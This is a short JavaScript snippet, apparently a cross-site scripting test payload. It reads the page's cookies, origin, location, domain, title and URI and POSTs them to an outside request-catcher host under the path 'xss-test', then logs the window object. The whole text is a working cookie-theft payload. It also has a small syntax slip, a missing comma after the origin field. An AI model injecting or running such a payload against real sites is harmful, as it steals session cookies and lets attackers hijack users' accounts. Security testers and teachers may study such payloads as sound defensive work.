fetch('https://br4ck3r.free.beeceptor.com/xss-test', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	body: JSON.stringify({
		data: {
			cookie: window.document.cookie,
			origin: window.origin
			location: window.document.location,
			domain: window.document.domain,
			title: window.document.title,
			uri: window.document.documentURI,
		},
	}),
});
console.log(window);
